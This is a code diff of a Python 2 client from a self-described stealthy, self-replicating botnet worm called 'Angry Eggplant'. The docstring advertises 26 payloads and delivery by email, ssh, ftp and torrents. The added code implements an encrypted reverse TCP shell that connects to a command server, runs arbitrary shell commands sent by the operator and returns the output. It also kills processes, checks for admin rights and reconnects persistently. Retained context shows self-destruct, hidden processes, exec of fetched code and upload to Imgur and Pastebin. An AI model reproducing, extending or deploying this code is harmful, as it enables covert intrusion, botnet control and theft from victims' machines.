@@ -21,27 +21,6 @@
 # OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
 # SOFTWARE.
 
-"""
-
-    ,adPPYYba, 8b,dPPYba,   ,adPPYb,d8 88,dPPYba,   aa       aa
-    ""     `Y8 88P'   `"8a a8"    `Y88 88P'   `"8a  88       88
-    ,adPPPPP88 88       88 8b       88 88	    8b	     88
-    88,    ,88 88       88 "8a,   ,d88 88	    "8a,   ,d88
-    `"8bbdP"Y8 88       88  `"YbbdP"Y8 88            `"YbbdP"Y8
-                            aa,    ,88 	             aa,    ,88
-                             "Y8bbdP"          	      "Y8bbdP'
-
-                                                   88                          ,d
-                                                   88                          88
-     ,adPPYba,  ,adPPYb,d8  ,adPPYb,d8 8b,dPPYba,  88 ,adPPYYba, 8b,dPPYba,    88
-    a8P     88 a8"    `Y88 a8"    `Y88 88P'    "8a 88 ""     `Y8 88P'   `"8a MM88MMM
-    8PP""""""" 8b       88 8b       88 88       d8 88 ,adPPPPP88 88       88   88
-    "8b,   ,aa "8a,   ,d88 "8a,   ,d88 88b,   ,a8" 88 88,    ,88 88       88   88
-     `"Ybbd8"'  `"YbbdP"Y8  `"YbbdP"Y8 88`YbbdP"'  88 `"8bbdP"Y8 88       88   88,
-                aa,    ,88  aa,    ,88 88                                      "Y888
-                 "Y8bbdP"    "Y8bbdP"  88
-
-"""
 
 
 from __future__ import print_function
@@ -92,12 +71,71 @@ def config(*arg, **options):
 
 class Client():
 
+    """
+
+     Is it possible to build an ultra-portable, stealthy and persistent worm which
+     self-replicates by infecting host machines with the purpose of building a
+     peer-to-peer botnet that is written in pure python, has zero dependencies,
+     runs on anything, requires no manual configuration, automates host discovery, 
+     and autonomously discovers and analyzes hosts to then generate, configure,
+     and compile a unique encrypted deliverable for each target, utilizing mulitiple
+     attack vectors for payload delivery, to gain a foothold, establish persistence,
+     while minimizing potential exposure of peers in the botnet - while all network
+     communication is encrypted end-to-end with state of the art cryptography?
+     
+     The Angry Eggplant project proposes the following solution:
+
+ 
+ 
+        ,adPPYYba, 8b,dPPYba,   ,adPPYb,d8 88,dPPYba,   aa       aa
+        ""     `Y8 88P'   `"8a a8"    `Y88 88P'   `"8a  88       88
+        ,adPPPPP88 88       88 8b       88 88	        8b       88
+        88,    ,88 88       88 "8a,   ,d88 88	        "8a,   ,d88
+        `"8bbdP"Y8 88       88  `"YbbdP"Y8 88            `"YbbdP"Y8
+                                aa,    ,88 	         aa,    ,88
+                                 "Y8bbdP"                 "Y8bbdP'
+
+                                                       88                          ,d
+                                                       88                          88
+         ,adPPYba,  ,adPPYb,d8  ,adPPYb,d8 8b,dPPYba,  88 ,adPPYYba, 8b,dPPYba,    88
+        a8P     88 a8"    `Y88 a8"    `Y88 88P'    "8a 88 ""     `Y8 88P'   `"8a MM88MMM
+        8PP8888888 8b       88 8b       88 88       d8 88 ,adPPPPP88 88       88   88
+        "8b,   ,aa "8a,   ,d88 "8a,   ,d88 88b,   ,a8" 88 88,    ,88 88       88   88
+         `"Ybbd8"'  `"YbbdP"Y8  `"YbbdP"Y8 88`YbbdP"'  88 `"8bbdP"Y8 88       88   88,
+                    aa,    ,88  aa,    ,88 88                                      "Y888
+                     "Y8bbdP"    "Y8bbdP"  88
+
+
+
+                            https://github.com/colental/ae
+    Features:
+
+        - 26 payloads
+
+        - End-to-end encryption
+
+        - Runs on Windows, Mac OS X, iOS, Linux, Android
+
+        _ Automated host discovery
+
+        - Multiple delivery vectors - email, ssh, ftp, social media, torrents, websites
+
+        - No dependencies 
+
+        - No configuration
+
+        - Pure python source
+
+        - Compiles source into native executable format for each host
+
+
+    """
 
     # Class Attributes
 
 
-    debug       = 1
-    _exit       = 0
+    debug       = True
+    abort       = False
     _jobs       = {}
     _network    = {}
     _queue      = Queue.Queue()
@@ -109,6 +147,9 @@ class Client():
 
 
     def __init__(self, **kwargs):
+        """
+        create a new instance of the client handler
+        """
         self._kwargs    = kwargs
         self._info      = Client._get_info()
         self._services  = Client._get_services()
@@ -122,38 +163,6 @@ class Client():
 
 
     @staticmethod
-    def _get_xor(s, t):
-        try:
-            return "".join(chr(ord(x) ^ ord(y)) for x, y in zip(s, t))
-        except Exception as e:
-            Client._debug("{} returned error: {}".format(Client._get_config.func_name, str(e)))
-
-
-    @staticmethod
-    def _get_padded(s, block_size):
-        try:
-            return bytes(s) + (block_size - len(bytes(s)) % block_size) * '\x00'
-        except Exception as e:
-            Client._debug("{} returned error: {}".format(Client._get_config.func_name, str(e)))
-
-    @staticmethod
-    def _get_blocks(s, block_size):
-        try:
-            return [s[i * block_size:((i + 1) * block_size)] for i in range(len(s) // block_size)]
-        except Exception as e:
-            Client._debug("{} returned error: {}".format(Client._get_blocks.func_name, str(e)))
-
-
-    @staticmethod
-    def _get_ipv4_address(address):
-        try:
-            if socket.inet_aton(str(address)):
-                return True
-        except:
-            return False
-
-
-    @staticmethod
     def _configure(target, **kwargs):
         if hasattr(Client, target):
             for k,v in kwargs.items():
@@ -161,7 +170,6 @@ class Client():
                     setattr(getattr(Client, target), k, v)
                 except Exception as e:
                     Client._debug("{} returned error: {}".format(Client._configure.func_name, str(e)))
-
 
     @staticmethod
     def _post(url, headers={}, data={}):
@@ -194,6 +202,61 @@ class Client():
                 self._queue.task_done()
             except:
                 break
+
+
+    @staticmethod
+    def _obfuscate(data):
+        a = bytearray(reversed(data))
+        b = Client._get_nth_prime(len(a) + 1)
+        return base64.b64encode("".join([(chr(a.pop()) if i in Client._get_primes(b) else os.urandom(1)) for i in xrange(b)]))
+
+
+    @staticmethod
+    def _deobfuscate(block):
+        return bytes().join(chr(bytearray(base64.b64decode(block))[_]) for _ in Client._get_primes(len(bytearray(base64.b64decode(block)))))
+
+
+    @staticmethod
+    def _encrypt(data):
+        return Client._encrypt_aes(data, Client._deobfuscate(Client._session['key'])) if 'AES' in Client.encrypt.mode else Client._encrypt_xor(data, Client._deobfuscate(Client._session['key']))
+
+
+
+    @staticmethod
+    def _decrypt(data):
+        return Client._decrypt_aes(data, Client._deobfuscate(Client._session['key'])) if 'AES' in Client.encrypt.mode else Client._decrypt_xor(data, Client._deobfuscate(Client._session['key']))
+
+
+    @staticmethod
+    def _get_xor(s, t):
+        try:
+            return "".join(chr(ord(x) ^ ord(y)) for x, y in zip(s, t))
+        except Exception as e:
+            Client._debug("{} returned error: {}".format(Client._get_config.func_name, str(e)))
+
+
+    @staticmethod
+    def _get_padded(s, block_size):
+        try:
+            return bytes(s) + (block_size - len(bytes(s)) % block_size) * '\x00'
+        except Exception as e:
+            Client._debug("{} returned error: {}".format(Client._get_config.func_name, str(e)))
+
+    @staticmethod
+    def _get_blocks(s, block_size):
+        try:
+            return [s[i * block_size:((i + 1) * block_size)] for i in range(len(s) // block_size)]
+        except Exception as e:
+            Client._debug("{} returned error: {}".format(Client._get_blocks.func_name, str(e)))
+
+
+    @staticmethod
+    def _get_ipv4_address(address):
+        try:
+            if socket.inet_aton(str(address)):
+                return True
+        except:
+            return False
 
 
     @staticmethod
@@ -283,24 +346,7 @@ class Client():
     def _get_usage(function):
         if hasattr(function, 'usage'):
             return "usage: %s" % getattr(function, 'usage')
-
-
-    @staticmethod
-    def _get_process_list(executables=False):
-        process_list = psutil.process_iter()
-        if not executables:
-            yield "{:>6}---------------------------------".format("PID","Name","Status")
-            for p in process_list:
-                try:
-                    yield "{:>6}\t{:>20}\t{:>10}".format(str(p.pid), str(p.name())[:19], str(p.status()))
-                except: pass
-        else:
-            yield "{:>6}\t{:>20}\t{:>10}\t{:>30}\n------------------------------------------------------------------------------".format("PID","Name","Status","Executable")
-            for p in process_list:
-                try:
-                    yield "{:>6}\t{:>20}\t{:>10}\t{:>30}".format(str(p.pid), str(p.name())[:19], str(p.status()), str(p.exe())[:29])
-                except: pass
-
+            
 
     @classmethod
     def _get_port(self, addr):
@@ -380,36 +426,24 @@ class Client():
         return True
 
 
-    def _get_address(Client):
+    def _get_address(self):
         if hasattr(self, '__a__') and hasattr(self, '__b__'):
             try:
-                a = Client._get_config(long(Client.__a__))
-                b = Client._get_config(long(Client.__b__))
+                a = self._get_config(long(self.__a__))
+                b = self._get_config(long(self.__b__))
                 c = urllib2.Request(a)
                 c.headers = {'API-Key': b}
                 d = urllib2.urlopen(c).read()
                 e = json.loads(d)
                 f = e[e.keys()[0]][0].get('ip')
-                if Client._get_ipv4_address(f):
+                if self._get_ipv4_address(f):
                     return f
                 else:
-                    Client._debug("{} returned invalid IPv4 address: '{}'\ndefaulting to localhost".format(self._get_address.func_name, str(f)))
+                    self._debug("{} returned invalid IPv4 address: '{}'\ndefaulting to localhost".format(self._get_address.func_name, str(f)))
                     return socket.gethostbyname(socket.gethostname())
             except Exception as e2:
-                Client._debug("{} returned error: {}".format(Client._get_address.func_name, str(e2)))
+                self._debug("{} returned error: {}".format(self._get_address.func_name, str(e2)))
         return socket.gethostbyname(socket.gethostname())
-
-
-    @staticmethod
-    def obfuscate(data):
-        data = bytearray(i for i in reversed(data))
-        z    = Client._get_nth_prime(len(data) + 1)
-        return base64.b64encode("".join([(chr(data.pop()) if i in Client._get_primes(z) else os.urandom(1)) for i in xrange(z)]))
-
-
-    @staticmethod
-    def deobfuscate(block):
-        return bytes().join(chr(bytearray(base64.b64decode(block))[_]) for _ in Client._get_primes(len(bytearray(base64.b64decode(block)))))
 
 
     @staticmethod
@@ -626,7 +660,7 @@ class Client():
             host = self._session['socket'].getpeername()[0]
         except socket.error:
             self._session['connection'].clear()
-            return self.new_session()
+            return self.session()
         port = int(port)
         sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         while retries > 0:
@@ -1033,10 +1067,138 @@ class Client():
 
 
 
-    def run(self):
-        self.new_session()
+    def run(self, *args, **kwargs):
+        self.session(*args, **kwargs)
         self._jobs[self.reverse_tcp_shell.func_name] = threading.Thread(target=self.reverse_tcp_shell, name=time.time())
         self._jobs[self.reverse_tcp_shell.func_name].start()
+
+
+    def send_data(self, **kwargs):
+        self._session['connection'].wait()
+        try:
+            self._session['socket'].sendall(self._encrypt(json.dumps(kwargs)) + '\n')
+        except socket.error:
+            self._session['connection'].clear()
+
+
+    def recv_data(self, end="\n"):
+        try:
+            data = ""
+            while end not in data:
+                try:
+                    data += self._session['socket'].recv(1024)
+                except socket.error: break
+            if data and len(data):
+                data = self._decrypt(data.rstrip())
+            return json.loads(data)
+        except Exception as e:
+            self._debug('{} error: {}'.format(self.recv_data.func_name, str(e)))
+
+        
+    def diffiehellman(self):
+        try:
+            g  = 2
+            p  = 0xFFFFFFFFFFFFFFFFC90FDAA22168C234C4C6628B80DC1CD129024E088A67CC74020BBEA63B139B22514A08798E3404DDEF9519B3CD3A431B302B0A6DF25F14374FE1356D6D51C245E485B576625E7EC6F44C42E9A637ED6B0BFF5CB6F406B7EDEE386BFB5A899FA5AE9F24117C4B1FE649286651ECE45B3DC2007CB8A163BF0598DA48361C55D39A69163FA8FD24CF5F83655D23DCA3AD961C62F356208552BB9ED529077096966D670C354E4ABC9804F1746C08CA18217C32905E462E36CE3BE39E772C180E86039B2783A2EC07A28FB5C55DF06F4C52C9DE2BCBF6955817183995497CEA956AE515D2261898FA051015728E5A8AACAA68FFFFFFFFFFFFFFFF
+            a  = bytes_to_long(os.urandom(32))
+            xA = pow(g, a, p)
+            self._session['socket'].send(long_to_bytes(xA))
+            xB = bytes_to_long(self._session['socket'].recv(256))
+            x  = pow(xB, a, p)
+            y  = SHA256.new(long_to_bytes(x)).hexdigest()
+            return self._obfuscate(y)
+        except Exception as e:
+            self._debug("Diffie-Hellman transactionless key-agreement failed with error: {}\nrestarting in 5 seconds...".format(str(e)))
+            time.sleep(1)
+            return self.diffiehellman()
+
+
+    def session(self, *args, **kwargs):
+        self.kill()
+        try:
+            port = 1337 if 'port' not in kwargs else int(kwargs.get('port'))
+            self._session['socket'] = self._get_connection(kwargs.get('host'), int(port)) if bool('host' in kwargs and self._get_ipv4_address(kwargs.get('host'))) else self._get_connection(self._get_address(), int(port))
+            _ = self._session['socket'].getpeername()
+            self._session['connection'].set()
+            self._debug('\nConnected to {}:{}\n'.format(*self._session['socket'].getpeername()))
+        except Exception as e1:
+            self._session['connection'].clear()
+            self._debug('\nConnection error: {}\nrestarting in 5 seconds...'.format(str(e1)))
+            time.sleep(5)
+            return self.session(*args, **kwargs)
+        try:                
+            self._session['key'] = self.diffiehellman()
+            if self._session['key'] and len(self._deobfuscate(bytes(self._session['key']))) == SHA256.block_size:
+                self._debug('Session Key: {}\n'.format(self._deobfuscate(self._session['key'])))
+                self._session['socket'].sendall(self._encrypt(json.dumps(self._info)) + '\n')
+                buf = ""
+                while '\n' not in buf:
+                    try:
+                        buf += self._session['socket'].recv(1024)
+                    except socket.timeout:
+                        self._debug('Waiting for Client ID...')
+                        continue
+                    
+                if buf and len(str(buf)):
+                    self._session['id'] = self._decrypt(buf.rstrip())
+                    if self._session['id'] == SHA256.new(self._info['ip'] + self._info['mac']).hexdigest():
+                        self._debug('Client ID: {}\n'.format(self._session['id']))
+                        self._session['socket'].setblocking(True)
+                        return
+                    else:
+                        self._debug("Invalid Client ID: {}".format(bytes(self._session['id'])))
+                else:
+                    self._debug("Unknown error: server returned blank Client ID")
+            else:
+                self._debug("Invalid session key detected\nObfuscated: {}\nDeobfuscated: {}\n".format(str(self._session['key']), self._deobfuscate(str(self._session['key']))))
+        except Exception as e2:
+            self._debug("{} returned error: {}\nrestarting in 5 seconds...".format(self.session.func_name, str(e2)))
+        time.sleep(5)
+        return self.session(*args, **kwargs)
+
+
+    def reverse_tcp_shell(self):
+        while True:
+            try:
+                if self._session['connection'].wait(timeout=3.0):
+                    prompt = {"id": "0" * 64, "client": self._session['id'], "command": "prompt", "data": "[{} @ %s]> " % os.getcwd()}
+                    self.send_data(**prompt)
+                    task   = self.recv_data()
+                    result = ""
+                    if task:
+                        command, _, action  = bytes(task['command']).partition(' ')
+                        self._debug("\nTask: {}\nClient: {}\nCommand: {}\n".format(task['id'], task['client'], task['command']))
+                        if command in self._commands:
+                            try:
+                                result  = bytes(self._commands[command]['method'](action)) if len(action) else bytes(self._commands[command]['method']())
+                            except Exception as e1:
+                                result  = "Error: %s" % bytes(e1)
+                        else:
+                            try:
+                                result  = bytes().join(subprocess.Popen(command, 0, None, subprocess.PIPE, subprocess.PIPE, subprocess.PIPE, shell=True).communicate())
+                            except Exception as e2:
+                                result  = "Error: %s" % bytes(e2)
+
+                    if result and result != "None":
+                        task.update({"data": result})
+                        self._debug("Sending task results:\n{}".format(json.dumps(task, indent=2)))
+                        self.send_data(**task)
+                    for name, worker in self._jobs.items():
+                        if not worker.is_alive():
+                            _ = self._jobs.pop(name, None)
+                            del _
+                    time.sleep(0.5)
+                else:
+                    self._debug("Client was disconnected - Restarting in 5 seconds...")
+                    time.sleep(5)
+                    break  
+            except Exception as e3:
+                self._debug("{} returned error: {}\nRestarting in 5 seconds...".format(self.reverse_tcp_shell.func_name, str(e3)))
+                time.sleep(5)
+                break
+        t = self._jobs.pop(self.reverse_tcp_shell.func_name, None)
+        del t
+        self.kill()
+        return self.run()
 
 
     @config(platforms=['win32','linux2','darwin'], command=True, usage="help")
@@ -1056,17 +1218,6 @@ class Client():
                 return str(e2)
         else:
             return "Invalid command - '{}' not found".format(str(command))
-
-    @staticmethod
-    @config(platforms=['win32','linux2','darwin'])
-    def _encrypt(data):
-        return Client._encrypt_aes(data, Client.deobfuscate(Client._session['key'])) if 'AES' in Client.encrypt.mode else Client._encrypt_xor(data, Client.deobfuscate(Client._session['key']))
-
-
-    @staticmethod
-    @config(platforms=['win32','linux2','darwin'])
-    def _decrypt(data):
-        return Client._decrypt_aes(data, Client.deobfuscate(Client._session['key'])) if 'AES' in Client.encrypt.mode else Client._decrypt_xor(data, Client.deobfuscate(Client._session['key']))
 
 
     @staticmethod
@@ -1252,32 +1403,38 @@ class Client():
     @config(platforms=['win32','linux2','darwin'], command=True, usage='ps [args]')
     def ps(self, args=None):
         """
-        list, search, or kill processes
+        list, search, kill processes
         """
         output = ""
-
+        process_list = psutil.process_iter()
         if not args:
-            for i in self._get_process_list():
-                output += '\n' + i
+            try:
+                
+                output = json.dumps({str(p.pid): "{:>25} | {:>15}".format(str(p.name())[:19], str(p.status())) for p in process_list})
+            except Exception as e:
+                Client._debug(str(e))
         else:
-            cmd, _, arg = str(args).partition(' ')
-        
-            if 'aux' in cmd or 'exe' in cmd:
-                for i in self._get_process_list(executables=True):
-                    output += '\n' + i
-            elif 'search' in cmd:
-                process_list = self._get_process_list(executables=True)
-                output       = next(process_list)
-                for i in process_list:
-                    if arg in i:
-                        output += '\n' + i                        
-            elif 'kill' in cmd or 'terminate' in cmd:
+            cmd, _, arg  = str(args).partition(' ')
+            if 'search' in cmd:
                 try:
-                    pr = psutil.Process(pid=int(arg))
-                    pr.kill()
-                    output = "Process {} killed".format(arg)
-                except:
-                    output = "Process {} does not exist or access was denied".format(arg)
+                    output = json.dumps({str(p.pid): "{:>25} | {:>15}".format(str(p.name())[:19], str(p.status())) for p in process_list if str(cmd) in str(p.name())})
+                except Exception as e:
+                    Client._debug(str(e))
+            elif 'kill' in cmd or 'terminate' in cmd:
+                if str(arg).isdigit():
+                    try:
+                        pr = psutil.Process(pid=int(arg))
+                        pr.kill()
+                        output = "\nProcess {} was killed".format(arg)
+                    except: pass
+                else:
+                    for p in process_list:
+                        try:
+                            if str(cmd) in str(p.name()):
+                                p.kill()
+                                output += "\nProcess {} killed".format(cmd)
+                        except Exception as e:
+                            Client._debug(str(e))
         return output
 
     
@@ -1318,10 +1475,6 @@ class Client():
             option, _, val = opt.partition('=')
             if not hasattr(self, target) or target not in self._commands:
                 return "command '{}' not found".format(target)
-            if not hasattr(getattr(self, target), 'options'):
-                return "command '{}' has no options".format(target)
-            if option not in getattr(self, target).options:
-                return "Option '{}' not found for target '{}'".format(option, target)
             if val.isdigit() and int(val) in (0,1):
                 val = bool(int(val))
             elif val.isdigit():
@@ -1332,7 +1485,7 @@ class Client():
                 val = False
             elif ',' in val:
                 val = val.split(',')
-            getattr(self, target).options[option] = val
+            setattr(getattr(self, target), option, val)
         except Exception as e:
             return "{} returned error: '{}'".format(self.set.func_name.strip('_').title(), str(e))
         return self.options(target.lower())
@@ -1423,10 +1576,17 @@ class Client():
         disconnect from server but keep client alive
         """
         def _standby(self):
+            addr = None
+            try:
+                addr = self._session['socket'].getpeername()
+            except: pass
             self.kill()
             while True:
                 time.sleep(60)
-                self.new_session()
+                if addr:
+                    self.session(host=addr[0], port=addr[1])
+                else:
+                    self.session()
                 if self._session['connection'].is_set():
                     break
             return self.reverse_tcp_shell()
@@ -1444,7 +1604,7 @@ class Client():
         check if current user has administrator privileges
         """
         try:   
-            return "\tCurrent User:\t{}\n\tAdministrator:\t{}".format(self._info.get('username'),  bool(os.getuid() == 0 if os.name is 'posix' else ctypes.windll.shell32.IsUserAnAdmin()))
+            return json.dumps({'username': self._info.get('username'),  'administrator': bool(os.getuid() == 0 if os.name is 'posix' else ctypes.windll.shell32.IsUserAnAdmin())})
         except Exception as e:
             return "{} returned error: '{}'".format(self.admin.func_name.strip('_').title(), str(e))
 
@@ -1581,7 +1741,7 @@ class Client():
         self-destruct and leave no trace on disk
         """
         try:
-            self._exit = True
+            self.abort = True
             self.kill()
             
             if hasattr(self, '__f__') and os.path.isfile(self._get_config(long(self.__f__))).read():
@@ -1618,164 +1778,13 @@ class Client():
             return p
         except Exception as e:
             self._debug("Hidden process error: {}".format(str(e)))
-            
-
-    def send_data(self, **kwargs):
-        self._session['connection'].wait()
-        try:
-            self._session['socket'].sendall(self._encrypt(json.dumps(kwargs)) + '\n')
-        except socket.error:
-            self._session['connection'].clear()
-
-
-    def recv_data(self, end="\n"):
-        try:
-            data = ""
-            while end not in data:
-                try:
-                    data += self._session['socket'].recv(1024)
-                except socket.error: break
-            if data and len(data):
-                data = self._decrypt(data.rstrip())
-            return json.loads(data, encoding='utf-8')
-        except Exception as e:
-            self._debug('{} error: {}'.format(self.recv_data.func_name, str(e)))
-
-        
-    def diffiehellman(self):
-        """
-        Diffie-Hellman transactionless key-agreement with 2048-bit modulus. Returns obfuscated 256-bit key
-        """
-        try:
-            g  = 2
-            p  = 0xFFFFFFFFFFFFFFFFC90FDAA22168C234C4C6628B80DC1CD129024E088A67CC74020BBEA63B139B22514A08798E3404DDEF9519B3CD3A431B302B0A6DF25F14374FE1356D6D51C245E485B576625E7EC6F44C42E9A637ED6B0BFF5CB6F406B7EDEE386BFB5A899FA5AE9F24117C4B1FE649286651ECE45B3DC2007CB8A163BF0598DA48361C55D39A69163FA8FD24CF5F83655D23DCA3AD961C62F356208552BB9ED529077096966D670C354E4ABC9804F1746C08CA18217C32905E462E36CE3BE39E772C180E86039B2783A2EC07A28FB5C55DF06F4C52C9DE2BCBF6955817183995497CEA956AE515D2261898FA051015728E5A8AACAA68FFFFFFFFFFFFFFFF
-            a  = bytes_to_long(os.urandom(32))
-            xA = pow(g, a, p)
-            self._session['socket'].send(long_to_bytes(xA))
-            xB = bytes_to_long(self._session['socket'].recv(256))
-            x  = pow(xB, a, p)
-            y  = SHA256.new(long_to_bytes(x)).hexdigest()
-            return self.obfuscate(y)
-        except Exception as e:
-            self._debug("Diffie-Hellman transactionless key-agreement failed with error: {}\nrestarting in 5 seconds...".format(str(e)))
-            time.sleep(5)
-            return self.run()
-
-
-    def new_session(self, port=1337):
-        """
-        create connection with server and register a new encrypted session
-        """
-        self.kill()
-        try:
-            if hasattr(self, '__v__'):
-                self._session['socket'] = self._get_connection('localhost', int(port))
-            else:
-                self._session['socket'] = self._get_connection(self._get_address(), int(port))
-            self._session['connection'].set()
-            self._debug('\nConnected to {}:{}\n'.format(*self._session['socket'].getpeername()))
-
-            self._session['key'] = self.diffiehellman()
-            self._debug('Session Key: {}\n'.format(self._session['key']))
-
-            self._session['socket'].sendall(self._encrypt(json.dumps(self._info)) + '\n')
-            self._debug(json.dumps(self._info, indent=2) + '\n')
-
-            buf = ""
-            while '\n' not in buf:
-                buf += self._session['socket'].recv(1024)
-            if buf and len(str(buf)):
-                self._session['id'] = self._decrypt(buf.rstrip())
-                self._debug('Client ID: {}\n'.format(self._session['id']))
-
-            self._session['socket'].setblocking(True)
-        except Exception as e:
-            self._debug("{} returned error: {}\nrestarting in 5 seconds...".format(self.new_session.func_name, str(e)))
-            time.sleep(5)
-            return self.run()
-
-
-    def reverse_tcp_shell(self):
-        """
-        remotely access the host machine with a reverse tcp shell through an encrypted connections
-        """
-        while True:
-            
-            try:
-                
-                if self._session['connection'].wait(timeout=5.0):
-
-                    prompt = {"id": "0" * 64, "client": self._session['id'], "command": "prompt", "data": "[{} @ %s]> " % os.getcwd()}
-                    
-                    self.send_data(**prompt)
-
-                    self._debug("Sent prompt:\n{}".format(json.dumps(prompt, indent=2)))
-
-                    task   = self.recv_data()
-
-                    result = ""
-
-                    if task:
-
-                        command, _, action  = bytes(task['command']).partition(' ')
-
-                        self._debug("\ntask: {}\nclient: {}\ncommand: {}\n".format(task['id'], task['client'], task['command']))
-                        
-                        if command in self._commands:
-
-                            self._debug("Running client command '{}'".format(self._commands[command]['method'].func_name))
-                            
-                            try:
-                                result  = bytes(self._commands[command]['method'](action)) if len(action) else bytes(self._commands[command]['method']())
-                            except Exception as e1:
-                                result  = "Error: %s" % bytes(e1)
-                        else:
-
-                            self._debug("Running shell command '{}'".format(command))
-                            
-                            try:
-                                result  = bytes().join(subprocess.Popen(command, 0, None, subprocess.PIPE, subprocess.PIPE, subprocess.PIPE, shell=True).communicate())
-                            except Exception as e2:
-                                result  = "Error: %s" % bytes(e2)
-
-                    if result and result != "None":
-
-                        task.update({"data": result})
-
-                        self._debug("Sending task results:\n{}".format(json.dumps(task, indent=2)))
-                    
-                        self.send_data(**task)
-                           
-                    for name, worker in self._jobs.items():
-                        if not worker.is_alive():
-                            _ = self._jobs.pop(name, None)
-                            del _
-
-                    time.sleep(0.5)
-
-                else:
-                    self._debug("Client was disconnected - Restarting in 5 seconds...")
-                    time.sleep(5)
-                    break  
-                
-            except Exception as e3:
-                self._debug("{} returned error: {}\nRestarting in 5 seconds...".format(self.reverse_tcp_shell.func_name, str(e3)))
-                time.sleep(5)
-                break
-        t = self._jobs.pop(self.reverse_tcp_shell.func_name, None)
-        del t
-        self.kill()
-        return self.run()
-
 
 
 
 def main(*args, **kwargs):
     try:
-
         if 'f' not in kwargs and '__file__' in globals():
-            kwargs['f'] = __file__
-
+            kwargs['f'] = globals()['__file__']
         if 'w' in kwargs:
             try:
                 exec "import urllib" in globals()
@@ -1784,7 +1793,6 @@ def main(*args, **kwargs):
                 exec w in globals()
             except Exception as e:
                 Client._debug("Dynamic package imports failed: {}".format(str(e)))
-
         if 'd' in kwargs:
             try:
                 d = kwargs.get('d')
@@ -1792,7 +1800,6 @@ def main(*args, **kwargs):
                 Client._configure('_upload_imgur', api_key=imgur_api_key)
             except Exception as e2:
                 Client._debug("Dynamic Imgur configuration failed: {}".format(str(e2)))
-                    
         if 'c' in kwargs:
             try:
                 c = kwargs.get('c')
@@ -1800,7 +1807,6 @@ def main(*args, **kwargs):
                 Client._configure('_upload_pastebin', api_dev_key=pastebin_api_key)
             except Exception as e3:
                 Client._debug("Dynamic Pastebin configuration failed: {}".format(str(e3)))
-                    
         if 'e' in kwargs:
             try:
                 e = kwargs.get('e')
@@ -1808,7 +1814,6 @@ def main(*args, **kwargs):
                 Client._configure('_upload_pastebin', api_user_key=pastebin_user_key)
             except Exception as e4:
                 Client._debug("Dynamic Pastebin configuration failed: {}".format(str(e4)))
-
         if 'q' in kwargs:
             try:
                 q = kwargs.get('q')
@@ -1824,7 +1829,10 @@ def main(*args, **kwargs):
 
     finally:
         payload = Client(**kwargs)
-        payload.run()
+        if 'v' in kwargs:
+            payload.run(host='127.0.0.1')
+        else:
+            payload.run()
         return payload
 
 
